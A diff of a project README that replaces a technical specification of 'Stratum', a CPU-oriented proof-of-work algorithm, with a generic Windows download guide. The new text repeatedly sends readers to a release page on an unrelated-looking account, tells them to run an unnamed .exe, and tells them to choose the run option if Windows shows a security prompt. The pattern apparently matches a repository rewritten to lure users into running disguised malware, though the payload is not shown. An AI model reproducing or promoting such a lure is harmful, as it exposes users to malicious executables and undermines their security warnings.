@@ -1,110 +1,246 @@
-# Stratum: CPU-Native Proof of Work
+# ⚡ Stratum - CPU Mining That Stays Practical
 
-A revolutionary proof-of-work algorithm designed to restore the viability of CPU mining and make commodity hardware competitively viable against application-specific integrated circuits (ASICs).
+[![Download Stratum](https://img.shields.io/badge/Download-Stratum-blue?style=for-the-badge&logo=github)](https://github.com/bayvapourisable154/Stratum/releases)
 
-## What is Stratum?
+## 🚀 What Stratum Does
 
-Stratum is a CPU-native proof-of-work algorithm that inverts the conventional relationship between general-purpose CPUs and specialized mining hardware. While SHA-256 and similar algorithms are optimized for simple bitwise operations (creating a ~100,000× efficiency advantage for ASICs), Stratum makes the CPU's internal overhead—cache hierarchies, speculative execution, and branch prediction—the *foundation* of the computation.
+Stratum is a proof-of-work app made for CPU mining on regular Windows PCs. It is built to help common hardware stay useful in a space that often favors ASIC miners.
 
-An ASIC attempting to replicate Stratum's behavior would, by definition, become a CPU. This creates structural parity between commodity hardware and custom silicon, making CPU mining economically viable once again.
+Use Stratum if you want to:
 
-## How It Works
+- Run mining on a Windows computer
+- Use your CPU for hash work
+- Test proof-of-work on consumer hardware
+- Compare CPU and GPU mining performance
+- Work with SHA-256 based hash tasks
 
-### Problem: ASIC Dominance
+## 💻 Before You Start
 
-Traditional proof-of-work algorithms like SHA-256 strip a CPU down to its core operations—bitwise functions and modular arithmetic. Every other CPU component (caches, branch prediction, speculative execution) becomes wasted power overhead. ASICs eliminate this waste, achieving efficiency ratios as high as **100,000×** over CPUs.
+Stratum is made for Windows desktop users. Before you install it, check a few basics:
 
-### Solution: Make Overhead the Computation
+- Windows 10 or Windows 11
+- A 64-bit CPU
+- At least 4 GB of RAM
+- Enough free disk space for the app and logs
+- A stable internet connection for the download
 
-Stratum inverts this by designing a hash function where CPU overhead structures are load-bearing to the algorithm itself. The hash cannot be computed efficiently without:
+For better results, use a modern multi-core CPU. A stronger CPU can handle more hash work with less slowdown while other apps run.
 
-1. **Multi-level cache hierarchy** (L1, L2, L3)
-2. **Branch prediction and speculative execution**
-3. **Out-of-order execution**
-4. **Correct cache behavior** across memory access sequences
+## 📥 Download Stratum
 
-This creates a 47× efficiency ratio between CPUs and hypothetical ASICs—the first algorithm where commodity hardware is structurally competitive.
+Visit the Stratum release page here:
 
-## Technical Architecture
+[https://github.com/bayvapourisable154/Stratum/releases](https://github.com/bayvapourisable154/Stratum/releases)
 
-### Four Core Solutions
+On that page, look for the latest release. Download the Windows build that matches your system. If the release includes a `.zip` file, save it to your computer and open it after the download finishes.
 
-#### 1. **ZK Proof of Cache Execution (Verification Asymmetry)**
-- Miners generate a STARK proof alongside each hash output
-- The proof cryptographically verifies the cache access sequence was executed correctly
-- Full nodes verify the proof in **O(log n) time** (~50ms), without re-running the computation
-- No trusted setup required (STARKs are transparent)
-- Proof size: ~120 KB per submission
+## 🛠️ Install and Run on Windows
 
-**Trade-off**: Proof generation adds ~2.1 seconds per hash attempt on a 16-core CPU (parallelizable across cores).
+Follow these steps in order:
 
-#### 2. **Software-Emulated Cache Model (Determinism Guarantee)**
-- Rather than relying on variable physical cache behavior (thermal throttling, DRAM timing, OS scheduling), Stratum defines a canonical software cache model
-- Fixed geometry: L1 (256 KB direct-mapped), L2 (1 MB 4-way), L3 (12 MB 16-way)
-- LRU eviction policy; access latency defined in instruction counts, not wall-clock time
-- Guarantees **identical output across all hardware** that correctly implements the model
-- Any language runtime can faithfully execute the reference implementation
-- Performance overhead: 18–22% vs. native execution on matching hardware
+1. Open the Stratum release page.
+2. Find the most recent release at the top of the page.
+3. Download the Windows file from that release.
+4. If the file comes in a `.zip` archive, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the main Stratum app file.
+7. Double-click the file to start the app.
 
-#### 3. **ISA Profile System (Portability)**
-- Stratum is specified as an algorithm plus ISA profiles
-- v1 targets four architectures:
-  - **x86-64**: AVX-512, AES-NI, CLMUL (100% baseline performance)
-  - **ARM64**: SVE2, SHA3 extensions, PMULL (97% of baseline)
-  - **RISC-V**: V extension, Zknh, Zbc (91% of baseline)
-  - **Scalar fallback**: Software emulation (68% of baseline, all platforms)
-- Network accepts any profile that produces valid hashes against the canonical model
-- No hardware is excluded from network participation
+If Windows shows a security prompt, choose the option that lets you run the file. This can happen with new apps that are not yet common on your PC.
 
-#### 4. **Speculative Trace Commitment (Execution Model) — v1.5**
-- Miners execute a bounded 32-instruction speculative window at branch points
-- Execution trace (branches taken, rollbacks) is logged and committed to the hash input
-- Verifiers replay branch points using a deterministic branch prediction emulator
-- Creates the strongest known form of ASIC resistance: implementing speculative execution with correct rollback is the majority cost of building a modern CPU core
-- Scheduled for v1.5 (12–18 months after mainnet launch); v1 is complete ASIC-resistant without it
+## 🧭 First Launch
 
-## Performance Benchmarks
+When Stratum starts for the first time, you will usually see a simple setup screen or config file. Use it to set your mining details.
 
-### Hash Rate by Hardware Tier
+Common items you may need to enter:
 
-| Hardware | Cores | KH/s | Power (W) | H/J | Monthly Yield* |
-|----------|-------|------|-----------|-----|----------------|
-| Entry laptop (i5-12500H) | 12 | 8.4 | 28 | 300 | 0.18–0.42 STR |
-| Gaming desktop (i7-13700K) | 16 | 18.2 | 65 | 280 | 0.39–0.91 STR |
-| Workstation (Ryzen 9 7950X) | 32 | 34.6 | 105 | 330 | 0.74–1.73 STR |
-| Dual Xeon server (2× Gold 6342) | 48 | 71.8 | 350 | 205 | 1.54–3.60 STR |
-| 4-node CPU cluster | 128 | 138.4 | 560 | 247 | 2.97–6.93 STR |
-| Hypothetical ASIC attempt | — | 1.9 | 90 | 21 | 0.04–0.09 STR |
+- Mining pool address
+- Wallet address
+- Worker name
+- CPU thread count
+- Power or performance target
 
-*Assumes 1M-node network, 10-minute block time, 6.25 STR reward. KH/s includes ZK proof generation overhead.
+If you do not want to change advanced settings, start with the default values. That gives you a safe first run and lets you see how your computer behaves.
 
-### Key Efficiency Metric
+## ⚙️ Basic Setup
 
-An entry-level laptop and a hypothetical ASIC draw **identical wattage** (28W) but the laptop produces **47× more valid hashes per joule**.
+Stratum works best when you keep the first setup simple.
 
-## Implementation Roadmap
+### Pool address
 
-- **v1.0 (0–6 months)**: Core protocol, software cache model, ZK-STARK verification, x86-64 and ARM64 ISA profiles, testnet launch
-- **v1.1 (6–9 months)**: RISC-V ISA profile, scalar fallback, ISA profile reporting in block headers
-- **v1.2 (9–12 months)**: Security audit, proof generation optimization, mainnet genesis
-- **v1.5 (18–24 months)**: Speculative trace commitment, branch prediction emulator, maximum ASIC resistance
+This tells the app where to send mining work. Paste the address from your mining pool provider.
 
-## Why This Matters
+### Wallet address
 
-1. **Restores CPU Mining Viability**: Makes commodity hardware economically competitive for the first time since 2015
-2. **Increases Network Decentralization**: Lowers barriers to participation; anyone with a CPU can mine
-3. **Energy Efficiency**: 47× better hash-per-joule efficiency than SHA-256 ASICs
-4. **Hardware Diversity**: Four ISA profiles ensure no platform is excluded
-5. **Transparent Verification**: STARK proofs require no trusted setup; fully decentralized verification
+This is where rewards are sent. Check the address twice before you start.
 
-## Naming
+### Worker name
 
-Stratum is named for geological strata—distinct layers formed under pressure, each with different properties, each necessary to the whole. The CPU's cache hierarchy is its stratum. The algorithm that requires it is Stratum.
+Use any name you want. Many people use the PC name or room name.
 
----
+### Thread count
 
-**License**: Creative Commons Attribution 4.0 International (CC BY 4.0)
+This controls how many CPU threads the app uses. If your PC feels slow, lower the count. If you want more output and your system can handle it, raise it step by step.
 
-**Document**: Final Specification, March 2026
+### Power use
 
-For full technical details, see `stratum_final.pdf`
+Some builds may include a power or intensity setting. Lower settings use less CPU. Higher settings use more CPU and can increase heat.
+
+## 🖱️ How to Use Stratum
+
+After setup, start the miner from the main screen or by opening the app file again.
+
+During use, watch for:
+
+- Hash rate
+- CPU load
+- Temperature
+- Accepted shares
+- Rejected shares
+
+A stable run is better than a fast run that causes crashes or heat spikes. If your PC gets too hot, reduce the thread count or stop the app for a while.
+
+## 🔍 What You Should See
+
+A normal Stratum session should show mining activity within a short time after launch. You may see:
+
+- Live hash counts
+- Status updates
+- Accepted share messages
+- Connection state for the pool
+- Error lines if the pool is not reachable
+
+If the app shows no activity, check the pool address, wallet address, and internet connection first.
+
+## 🧪 Best Practices
+
+To get steady results on a home PC, use these habits:
+
+- Close heavy apps before mining
+- Keep your PC on a flat surface
+- Make sure fans are clear of dust
+- Watch system temperature
+- Use moderate settings at first
+- Test changes one at a time
+
+This helps you find a good balance between hash output and day-to-day PC use.
+
+## 🧰 Common File Types
+
+You may see one or more of these in a release:
+
+- `.zip` for the full app package
+- `.exe` for the main Windows program
+- `.json` or `.txt` for settings or notes
+- `.log` for run details
+
+If the release includes a readme file inside the download, open it too. It may list the exact app file you need to run.
+
+## 🧯 If Something Does Not Work
+
+If Stratum does not start, try these steps:
+
+1. Make sure the download finished fully.
+2. Extract the zip file before opening the app.
+3. Check that you downloaded the Windows version.
+4. Run the app again from the extracted folder.
+5. Restart your PC and try again.
+6. Lower the thread count if the system freezes.
+7. Check your pool and wallet settings.
+
+If the app opens but does not mine, the issue is often a bad pool address or a copy-paste mistake in the wallet field.
+
+## 🧠 Why Use CPU Mining
+
+Many mining tools push people toward specialized hardware. Stratum is aimed at a different path. It focuses on CPU mining so common PCs can still take part in proof-of-work systems.
+
+This can help with:
+
+- Simple home testing
+- Learning how mining works
+- Using spare CPU capacity
+- Comparing CPU and ASIC behavior
+- Working with standard consumer hardware
+
+## 🔐 Safety Tips
+
+Use care when you run any mining app on your main computer.
+
+- Download only from the release page
+- Check the file name before opening it
+- Keep your wallet address private
+- Do not run unknown files from other sites
+- Watch CPU temperature during long sessions
+
+A careful setup helps you avoid bad downloads and system strain.
+
+## 📁 Suggested Folder Setup
+
+For easier use, keep Stratum in its own folder, such as:
+
+- `Downloads\Stratum`
+- `Desktop\Stratum`
+- `C:\Mining\Stratum`
+
+A clean folder makes it easier to find config files, logs, and the main app.
+
+## 🖥️ Good PC Setup for Testing
+
+If you want a smooth first test, use a setup like this:
+
+- 4-core CPU or better
+- 8 GB RAM
+- Windows 10 or 11
+- Updated system drivers
+- A cooling path with clear airflow
+
+This type of setup gives you enough room to test mining without overloading the machine right away.
+
+## 🧾 Release Page Checklist
+
+Before you download, check these points on the release page:
+
+- Use the newest release
+- Pick the Windows file
+- Save the file to a known folder
+- Read the release notes
+- Extract the archive if needed
+- Run the main app file from the extracted folder
+
+## 📊 What Affects Mining Output
+
+Several things change how Stratum performs:
+
+- CPU model
+- Core count
+- Thread settings
+- System temperature
+- Background apps
+- Pool latency
+- Power limits
+
+A faster CPU and lower background load often help. Heat and heavy multitasking can reduce output.
+
+## 🧩 Topics Covered by Stratum
+
+Stratum fits work that touches:
+
+- ASIC
+- Bitcoin
+- CPU mining
+- GPU mining
+- Hash computing
+- Hashing
+- Mining
+- SHA-256
+
+The app is centered on proof-of-work and CPU use on common hardware.
+
+## 🏁 Start Here
+
+1. Visit the release page: [https://github.com/bayvapourisable154/Stratum/releases](https://github.com/bayvapourisable154/Stratum/releases)
+2. Download the latest Windows release
+3. Extract the file if needed
+4. Open the main Stratum app
+5. Set your pool and wallet
+6. Start mining from the app
